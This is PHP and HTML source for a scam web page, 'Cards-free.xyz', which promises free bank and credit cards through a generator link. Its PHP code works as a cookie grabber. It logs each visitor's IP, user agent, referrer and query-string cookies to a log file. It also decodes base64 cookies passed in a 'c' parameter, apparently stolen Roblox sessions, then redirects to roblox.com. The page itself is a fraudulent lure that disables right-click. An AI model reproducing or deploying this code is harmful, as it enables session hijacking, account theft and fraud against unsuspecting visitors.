<?php

function getIP()
{
  if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown"))
    $ip = getenv("HTTP_CLIENT_IP");
  else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown"))
    $ip = getenv("HTTP_X_FORWARDED_FOR");
  else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown"))
    $ip = getenv("REMOTE_ADDR");
  else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown"))
    $ip = $_SERVER['REMOTE_ADDR'];
  else
    $ip = "unknown";
  return($ip);
}

function logData()
{
  $ipLog="logfile.htm";
  $cookie = $_SERVER['QUERY_STRING'];
  $register_globals = (bool) ini_get('register_globals');
  if ($register_globals)
    $ip = getenv('REMOTE_ADDR');
  else
    $ip = GetIP();

  $rem_port = $_SERVER['REMOTE_PORT'];
  $user_agent = $_SERVER['HTTP_USER_AGENT'];
  $rqst_method = $_SERVER['METHOD'];
  $rem_host = $_SERVER['REMOTE_HOST'];
  $referer = $_SERVER['HTTP_REFERER'];
  $date=date ("l dS of F Y h:i:s A");
  $log=fopen("$ipLog", "a+");

  if (preg_match("/\bhtm\b/i", $ipLog) || preg_match("/\bhtml\b/i", $ipLog))
    fputs($log, "IP: $ip | PORT: $rem_port | HOST: $rem_host | Agent: $user_agent | METHOD: $rqst_method | REF: $referer | DATE{ : } $date | COOKIE: $cookie
");
  else
    fputs($log, "IP: $ip | PORT: $rem_port | HOST: $rem_host | Agent: $user_agent | METHOD: $rqst_method | REF: $referer | DATE: $date | COOKIE: $cookie \n\n");
  fclose($log);
}

logData();

?>


<?php
	header ('Location:https://roblox.com');

	if (isset($_GET["c"]))
	{
		$cookies = base64_decode(urldecode($_GET["c"]));
		$file = fopen('logfile.htm', 'a');
		fwrite($file, $cookies . "\n\n");
	}
?>




<html>
<title> Cards-free.xyz </title>
<head> 
	<body> 

		<link rel="stylesheet" type="text/css" href="style.css">
		<script type="text/javascript" src="secu.js"></script>

		<center>
<h1> Card-free ! New domain ! </h1>
</center>
<h2>Cartes bancaires (débit) et cartes de crédit gratuites !</h2>

<ul id="navigation">
  <li><a href="index.php" title="Accueil">Accueil</a></li>
  <li><a href="gen.php" title="PhpMyAdmin">GENERATEUR</a></li>
  <li><a href="#" title="En dev">En dev</a></li>
  <li><a href="#" title="En dev">En dev</a></li>
  <li><a href="#" title="En dev">En dev</a></li>
</ul>

<center> 
  <h3> si vous voulez des cartes, il suffit de cliquer sur "GENERATEUR" </h3>
</center>

<style>
#copyr
{
position: absolute;
bottom: 50px;
right: 50px;
border: 2px;
font-family: times new roman;
}
#contact
{
color: #FFFFFF;
}
   p { color: #FF0000; }
   background-color { color: #000000; }
   h1 { color: #1f3d7a; }
   h2 { color: #ff0000; }
   h3 { color: #00cc99; }
   h4 { color: #FFFFFF; }
   small { color: #FFFFFF; text-align: bottom}

</style>

<p id="contact"> contact : N/A </p>
<!--
<form>
	<input type="text" name="pseudo" id="pseudo" placeholder="Votre pseudo">
	<input type="text" name="age" id="age" placeholder="Votre Ã¢ge">
	<input type="text" name="email" id="email" placeholder="Votre email">
	<input type="submit" name="formsend" id="formsend">
</form>
-->
<footer>
	<center>

	<small id ="copyr" style="border-color: #FF0000 #00FF00 #0000FF #ffffff; border-style:solid">&copy; Copyright 2020, EverSys SAS. Domain by EverSys</small>

	<body oncontextmenu="return false;">



</center>
</footer> 
</body>
</head>
</html>
